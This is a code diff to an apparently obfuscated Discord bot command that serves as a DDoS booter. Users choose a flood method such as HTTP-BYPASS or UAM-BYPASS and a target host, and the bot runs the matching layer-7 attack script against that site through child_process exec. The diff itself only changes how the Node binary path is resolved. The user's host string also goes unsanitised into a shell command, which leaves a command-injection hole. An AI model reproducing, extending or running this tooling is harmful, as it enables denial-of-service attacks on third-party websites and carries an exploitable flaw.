@@ -1,5 +1,4 @@
 const { MessageEmbed } = require('discord.js');
-const which = require('which');
 const ayarlar = require('../../ayarlar.json');
 var version = ayarlar['versionbot'];
 var roleID6 = ayarlar['roleID6'];
@@ -68,12 +67,13 @@ module['exports'] = {
                 })['setTimestamp']()]
             })
         };
+        const pathNode = require('path').join(require('path').dirname(require('which').sync('node')), 'node');
         const _0xf396x9 = _0xf396x8['options']['getString']('methods');
         const website = _0xf396x8['options']['getString']('host');
             if (_0xf396x9 === 'BASIC-KID') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -117,7 +117,7 @@ module['exports'] = {
         if (_0xf396x9 === 'HTTP-LOAD') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -160,7 +160,7 @@ module['exports'] = {
         }if (_0xf396x9 === 'raw') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -204,7 +204,7 @@ module['exports'] = {
             if (_0xf396x9 === 'HTTP-MAX') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${'  5 60http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${'  5 60http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -248,7 +248,7 @@ module['exports'] = {
             if (_0xf396x9 === 'HTTP-BYPASS') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -292,7 +292,7 @@ module['exports'] = {
             if (_0xf396x9 === 'UAM-BYPASS') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 120 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 120 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -336,7 +336,7 @@ module['exports'] = {
             if (_0xf396x9 === 'HTTP-STORM') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
@@ -378,7 +378,7 @@ module['exports'] = {
             if (_0xf396x9 === 'HTTP-OFF') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'node basic/L7/'}${method}${'.js '}${website}${' 60 off 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 off 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
